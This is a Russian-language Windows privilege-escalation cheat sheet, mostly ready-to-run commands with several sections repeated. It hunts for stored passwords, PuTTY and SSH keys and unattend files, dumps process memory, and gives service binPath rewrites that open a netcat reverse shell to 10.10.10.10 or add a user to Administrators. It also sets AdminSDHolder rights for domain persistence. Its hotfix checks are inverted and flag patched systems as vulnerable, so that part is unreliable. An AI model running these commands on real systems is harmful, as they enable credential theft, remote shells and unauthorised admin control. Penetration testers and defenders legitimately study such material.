# Проверка версии ОС
```
if ( systeminfo | findstr /i "2000 XP 2003 2008 vista" ) { Write-Host "Vulns: Old OS version" }
```

# Проверка верий
```
$Version = Get-ComputerInfo -Property "*version"
```
```
WindowsCurrentVersion              : X.X
WindowsVersion                     : XXXX
BiosBIOSVersion                    : {XXXXXX - XXXXXXX, X.XX, XXXXXXXX XXXXXXXXXX - XXXXX}
BiosEmbeddedControllerMajorVersion : XX
BiosEmbeddedControllerMinorVersion : XX
BiosSMBIOSBIOSVersion              : X.XX
BiosSMBIOSMajorVersion             : X
BiosSMBIOSMinorVersion             : X
BiosSystemBiosMajorVersion         : XX
BiosSystemBiosMinorVersion         : XX
BiosVersion                        : XXXXXX - XXXXXXX
OsVersion                          : XX.X.XXXXX
OsCSDVersion                       :
OsServicePackMajorVersion          : X
OsServicePackMinorVersion          : X
```

```
$System = Get-ComputerInfo -Property "*system*"
```
```
WindowsSystemRoot          : X:\XXXXXXX
BiosSystemBiosMajorVersion : XX
BiosSystemBiosMinorVersion : XX
BiosTargetOperatingSystem  : X
CsPCSystemType             : XXXXXX
CsPCSystemTypeEx           : XXXXXX
CsSystemFamily             : XXXX_XXXXXX XXXXXXXXXX
CsSystemSKUNumber          : XXXXXXXXXXX
CsSystemType               : XXX-XXXXX XX
OsOperatingSystemSKU       : XX
OsSystemDevice             : \XXXXXX\XXXXXXXXXXXXXX
OsSystemDirectory          : X:\XXXXXXX\XXXXXXXX
OsSystemDrive              : X:
OsPortableOperatingSystem  : XXXXXX
```

# Процессы

```
Get-Process | Select-Object -Property ProcessName, Id, WS
```

```
Get-Process Explorer | Select-Object -Property ProcessName -ExpandProperty Modules | Format-List
```

```
Get-Process Explorer | Select-Object -Property ProcessName -ExpandProperty Modules
```

```
Get-Process Explorer | Select-Object -Property ProcessName, Id -ExpandProperty Modules | Format-List
```

```
Get-Process explorer | Format-List *
```
*Эта команда получает все доступные данные о процессах Explorer на компьютере. Он использует параметр **Name** для указания процессов, но опускает необязательное имя параметра. Оператор конвейера ( `|`) передает данные `Format-List`командлету, который отображает все доступные свойства ( `*`) объектов процессовExplorer.*

```
Get-Process | Where-Object {$_.WorkingSet -gt 20000000}
```
*Эта команда получает все процессы, рабочий набор которых превышает 20 МБ. Он использует Get-Processкомандлет для получения всех запущенных процессов. Оператор конвейера ( |) передает объекты процесса Where-Objectкомандлету, который выбирает только объект со значением больше 20 000 000 байт для свойства WorkingSet .*

*Рабочий набор — это одно из многих свойств объектов процесса. Чтобы просмотреть все свойства, введите Get-Process | Get-Member. По умолчанию значения всех свойств суммы указаны в байтах, даже если в отображении по умолчанию они указаны в килобайтах и мегабайтах.*


# Найти владельца процесса
```
Get-Process cmd -IncludeUserName
```

```
$Process = Get-Process | Format-Table -View priority
```
```
   PriorityClass: High
ProcessName                  Id   HandleCount WorkingSet64
-----------                  --   ----------- ------------
XXXXXXXX                  XXXXX           XXX     XXXXXXXX
```
*Нужны ли нам процессы, собранные по приоритету?
Какие применимы фильтры?*

#### Получить все процессы, имеющие заголовок главного окна, и отобразить их в таблице
```
Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle -AutoSize
```


# Проверяем HotFix
```
$HotFix = wmic qfe get Caption,Description,HotFixID,InstalledOn

if ( $HotFix | findstr /C:"KB2592799" ) { Write-Host "Vulns: XP/SP3,2K3/SP3-afd.sys" }
if ( $HotFix | findstr /C:"KB3143141" ) { Write-Host "Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon" }
if ( $HotFix | findstr /C:"KB2393802" ) { Write-Host "Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa" }
if ( $HotFix | findstr /C:"KB982799" ) { Write-Host "Vulns: 2K8,Vista,7/SP0-Chimichurri" }
if ( $HotFix | findstr /C:"KB979683" ) { Write-Host "Vulns: 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel" }
if ( $HotFix | findstr /C:"KB2305420" ) { Write-Host "Vulns: 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched" }
if ( $HotFix | findstr /C:"KB981957" ) { Write-Host "Vulns: XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout" }
if ( $HotFix | findstr /C:"KB4013081" ) { Write-Host "Vulns: 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading" }
if ( $HotFix | findstr /C:"KB977165" ) { Write-Host "Vulns: 2K,XP,2K3,2K8,Vista,7-User Mode to Ring" }
if ( $HotFix | findstr /C:"KB941693" ) { Write-Host "Vulns: 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys" }
if ( $HotFix | findstr /C:"KB920958" ) { Write-Host "Vulns: 2K/SP4-ZwQuerySysInfo" }
if ( $HotFix | findstr /C:"KB914389" ) { Write-Host "Vulns: 2K,XP/SP2-Mrxsmb.sys" }
if ( $HotFix | findstr /C:"KB908523" ) { Write-Host "Vulns: 2K/SP4-APC Data-Free" }
if ( $HotFix | findstr /C:"KB890859" ) { Write-Host "Vulns: 2K/SP3/4,XP/SP1/2-CSRSS" }
if ( $HotFix | findstr /C:"KB842526" ) { Write-Host "Vulns: 2K/SP2/3/4-Utility Manager" }
if ( $HotFix | findstr /C:"KB835732" ) { Write-Host "Vulns: 2K/SP2/3/4,XP/SP0/1-LSASS service BoF" }
if ( $HotFix | findstr /C:"KB841872" ) { Write-Host "Vulns: 2K/SP4-POSIX" }
if ( $HotFix | findstr /C:"KB2975684" ) { Write-Host "Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer" }
if ( $HotFix | findstr /C:"KB3136041" ) { Write-Host "Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address" }
if ( $HotFix | findstr /C:"KB3057191" ) { Write-Host "Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys" }
if ( $HotFix | findstr /C:"KB2989935" ) { Write-Host "Vulns: 2K3/SP2-TCP/IP" }
if ( $HotFix | findstr /C:"KB2778930" ) { Write-Host "Vulns: Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast" }
if ( $HotFix | findstr /C:"KB2850851" ) { Write-Host "Vulns: 7SP0/SP1_x86-schlamperei" }
if ( $HotFix | findstr /C:"KB2870008" ) { Write-Host "Vulns: 7SP0/SP1_x86-track_popup_menu" }
```

---

# Разрешения на изменение реестра служб

Вы должны проверить, можете ли вы изменить реестр какой-либо службы. Вы можете **проверить** свои **разрешения** в **реестре служб,** выполнив:

```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Проверьте, есть ли у **аутентифицированных пользователей** или **NT AUTHORITY\INTERACTIVE** полный контроль. В этом случае вы можете изменить двоичный файл, который будет выполняться службой.

Чтобы изменить путь исполняемого файла:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

# Приложения

# Установленные приложения

Проверьте **права доступа к двоичным файлам** (возможно, вы сможете перезаписать один из них и повысить привилегии) и к **папкам** ( [захват DLL](/windows-hardening/windows-local-privilege-escalation/dll-hijacking) ).

```
dir /a "C:\Program Files"

dir /a "C:\Program Files (x86)"

reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

# Файлы и реестр (учетные данные)

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

# Ключи хоста Putty SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

# Ключи SSH в реестре

Закрытые ключи SSH могут храниться внутри раздела реестра `HKCU\Software\OpenSSH\Agent\Keys`, поэтому вам следует проверить, есть ли там что-нибудь интересное:

```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

Если вы найдете какую-либо запись внутри этого пути, вероятно, это будет сохраненный ключ SSH. Он хранится в зашифрованном виде, но его можно легко расшифровать с помощью [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) . Подробнее об этом методе здесь:[](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Если `ssh-agent`служба не запущена и вы хотите, чтобы она автоматически запускалась при загрузке:

```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

# Оставленные без присмотра файлы

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

# Внутри реестра

**Возможные ключи реестра с учетными данными**

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

# **Общий поиск пароля в файлах и реестре**

**Поиск содержимого файла**

```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Поиск файла с определенным именем файла

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

Найдите в реестре имена ключей и пароли.

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

---

# Защита LSA

Microsoft в **Windows 8.1 и более поздних версиях** предоставила дополнительную защиту для LSA, чтобы **предотвратить** **чтение памяти** или внедрение кода ненадежными процессами .

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```

## Охранник учетных данных

**Credential Guard** — это новая функция в Windows 10 (выпуск Enterprise и Education), которая помогает защитить ваши учетные данные на компьютере от таких угроз, как передача хэша.

```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```

## Кэшированные учетные данные

**Учетные данные домена** используются компонентами операционной системы и **аутентифицируются** **локальным** администратором **безопасности** (LSA). Как правило, учетные данные домена устанавливаются для пользователя, когда зарегистрированный пакет безопасности аутентифицирует данные входа пользователя. 

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

# UAC

UAC используется для того, чтобы **пользователь-администратор не давал права администратора каждому выполняемому процессу** . Это **достигается использованием по умолчанию** **маркера пользователя** с низкими привилегиями . 

```
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
```

---

#  **Изменить binPath службы**

Если группа «Прошедшие проверку» имеет **SERVICE_ALL_ACCESS** в службе, она может изменить двоичный файл, который выполняется службой. Чтобы изменить его и выполнить **nc** , вы можете сделать:

```
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config <Service_Name> binpath= "net localgroup administrators username /add"

sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"

sc start newservicename
```
---

# AlwaysInstallElevated

**Если** эти 2 регистра **включены** (значение **0x1** ), то пользователи с любыми привилегиями могут **устанавливать** (выполнять) `*.msi`файлы как NT AUTHORITY\ **SYSTEM** .

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

# Файлы и реестр (учетные данные)

## Putty Creds

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

## Ключи хоста Putty SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

## Ключи SSH в реестре
Закрытые ключи SSH могут храниться внутри раздела реестра `HKCU\Software\OpenSSH\Agent\Keys`, поэтому вам следует проверить, есть ли там что-нибудь интересное:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

---

# [Службы (Services)](https://winitpro.ru/index.php/2019/09/05/upravlenie-sluzhbami-windows-powershell/)

#### Получить список услуг

```
net start

wmic service list brief

sc query

Get-Service
```

#### Разрешения
`sc` используется для получения информации об услуге

```
sc qc <service_name>
```

Рекомендуется иметь бинарный **accesschk** от _Sysinternals_ Для проверки требуемого уровня привилегий для каждой службы рекомендуется иметь бинарный **accesschk** от _Sysinternals_ .

```
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендуется проверить, могут ли «Прошедшие проверку пользователи» изменять какой-либо сервис:

```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

accesschk.exe -uwcqv %USERNAME% * /accepteula

accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul

accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

#### Включить службу

а)
```
sc config SSDPSRV start= demand

sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

б)
```
sc.exe config usosvc start= auto
```
---
# Потенциально опасные службы

`Удаленный реестр (RemoteRegistry)` — позволяет удаленным пользователям изменять параметры реестра на вашем компьютере. Если остановить службу, то реестр может быть изменен только локальными пользователями, работающими на компьютере.

`Службы терминалов (TermService)` — служба предназначена для удаленного подключения к компьютеру по сети. Данная служба является основной для удаленного рабочего стола, удаленного администрирования, удаленного помощника и служб терминалов.

`Служба обнаружения SSDP (SSDPSRV)` — служба предназначена для обнаружения UPnP-устройств в домашней сети. UPnP (Universal Plug and Play) — универсальная автоматическая настройка и подключение сетевых устройств друг к другу, в результате чего сеть может стать доступной большому числу людей.

`Планировщик заданий (Shedule)` — данная служба позволяет настраивать расписание автоматического выполнения задач на компьютере. Автоматически запускает различные программы, скрипты и т. п. в запланированное время. Часто используется вирусами для автозагрузки или для отложенного выполнения. Многие легальные программы используют данную службу для своей работы, например антивирусы для ежедневного обновления антивирусных баз. Посмотреть список заданий можно тут: Пуск — Программы — Стандартные — Служебные — Назначенные задания.

`Диспетчер сеанса справки для удаленного рабочего стола (Remote Desktop Help Session Manager)` — служба управляет возможностями Удаленного помощника.

`Telnet (Telnet)` — позволяет удаленному пользователю входить и запускать программы, поддерживает различные клиенты TCP/IP Telnet, включая компьютеры с операционными системами Unix и Windows. Обеспечивает возможность соединения и удалённой работы в системе по протоколу Telnet (Teletype Network) с помощью командного интерпретатора. Данный протокол не использует шифрование и поэтому очень уязвим для атак при применении его в сети. Если эта служба остановлена, то удаленный пользователь не сможет запускать программы.

`Вторичный вход в систему (Seclogon)` — служба позволяет запускать процессы от имени другого пользователя.

---
# Потенциально опасные привелегии
- SeTakeOwnershipPrivilege, Смена владельцев файлов и других объектов
- SeSystemEnvironmentPrivilege, Изменение параметров среды изготовителя
- SeSecurityPrivilege, Управление аудитом и журналом безопасности
- SeIncreaseBasePriorityPrivilege, Увеличение приоритета выполнения
- SeDebugPrivilege, Отладка программ
- SeIncreaseWorkingSetPrivilege, Увеличение рабочего набора процесса

---

# Пользователи и группы

### Обзор пользователей и группы

```
# CMD

net users %username% #Me

net users #All local users

net localgroup #Groups

net localgroup Administrators #Who is inside Administrators group

whoami /all #Check the privileges
```

```
# PS

Get-WmiObject -Class Win32_UserAccount

Get-LocalUser | ft Name,Enabled,LastLogon

Get-ChildItem C:\Users -Force | select Name

Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

##### Администраторы

	-   Администраторы
	-   Администраторы домена
	-   Администраторы предприятия

#### Группа AdminSDHolder

Список контроля доступа (ACL) объекта **AdminSDHolder** используется в качестве шаблона для **копирования** **разрешений** для **всех «защищенных групп»** в Active Directory и их членов. Защищенные группы включают привилегированные группы, такие как администраторы домена, администраторы, администраторы предприятия и администраторы схемы. По умолчанию ACL этой группы копируется во все «защищенные группы». Это делается для того, чтобы избежать преднамеренных или случайных изменений этих критических групп. Однако, если злоумышленник изменит ACL группы **AdminSDHolder,** например, предоставив полные разрешения обычному пользователю, этот пользователь будет иметь полные разрешения для всех групп внутри защищенной группы (через час). И если кто-то попытается удалить этого пользователя из Администрации домена (например) через час или меньше, пользователь вернется в группу.

##### Добавьте пользователя в группу **AdminSDHolder** :

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

Проверка, входит ли пользователь в группу администраторов **домена** :

```
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

- [Пример скрипта](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

- [hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges)

### Зарегистрированные пользователи

```
qwinsta

klist sessions
```

### Домашние папки

```
dir C:\Users

Get-ChildItem C:\Users
```

### Политика паролей

```
net accounts
```

### Получение содержимого буфера обмена

```
powershell -command "Get-Clipboard"
```
---
# Запущенные процессы

## Права доступа к файлам и папкам

Прежде всего, список процессов **проверяет наличие паролей внутри командной строки процесса** . Проверьте, можете ли вы **перезаписать какой-либо исполняемый двоичный файл** или у вас есть права на запись в двоичную папку для использования возможных атак [Dll Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

```
Tasklist /SVC #List processes running and services

tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames

Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames

Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Всегда проверяйте , нет ли запущенных *электронных/цефовых/хромовых отладчиков* , вы можете злоупотреблять ими для повышения привилегий.

#### Проверка разрешений бинарников процессов

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (

for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (

icacls "%%z"

2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.

)

)
```

#### Проверка разрешений папок бинарников процессов

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v

"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (

icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users

todos %username%" && echo.

)
```

## Добыча паролей памяти

```
procdump.exe -accepteula -ma <proc_name_tasklist>
```

## Небезопасные приложения с графическим интерфейсом

**Приложения, работающие как SYSTEM, могут позволить пользователю создавать CMD или просматривать каталоги.**

Пример: «Справка и поддержка Windows» (Windows + F1), найдите «командная строка», нажмите «Нажмите, чтобы открыть командную строку».

## Слабые разрешения для исполняемых файлов сервисов

**Проверьте, можете ли вы изменить двоичный файл, который выполняется службой,** или есть ли у вас **права на запись в папку** , в которой находится двоичный файл ( [**захват DLL**](/windows-hardening/windows-local-privilege-escalation/dll-hijacking) ) **.** Вы можете получить каждый двоичный файл, выполняемый службой, с помощью **wmic** (не в system32) и проверить свои разрешения с помощью **icacls** :

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Вы также можете использовать **sc** и **icacls** :

```
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

## Разрешения на изменение реестра служб

Вы должны проверить, можете ли вы изменить реестр какой-либо службы. Вы можете **проверить** свои **разрешения** в **реестре служб,** выполнив:

```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Проверьте, есть ли у **аутентифицированных пользователей** или **NT AUTHORITY\INTERACTIVE** полный контроль. В этом случае вы можете изменить двоичный файл, который будет выполняться службой.

Чтобы изменить путь исполняемого файла:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

# Приложения

## Установленные приложения

Проверьте **права доступа к двоичным файлам** (возможно, вы сможете перезаписать один из них и повысить привилегии) и к папкам 

```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

## Разрешения на запись

Проверьте, можете ли вы изменить какой-либо файл конфигурации, чтобы прочитать какой-то специальный файл, или можете ли вы изменить какой-либо двоичный файл, который будет выполняться учетной записью администратора (плановые задачи).

Способ найти слабые права доступа к папкам/файлам в системе:

```
accesschk.exe /accepteula 

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

## Драйверы

Ищите возможные **сторонние странные/уязвимые** драйверы

```
driverquery
driverquery.exe /fo table
driverquery /SI
```

---
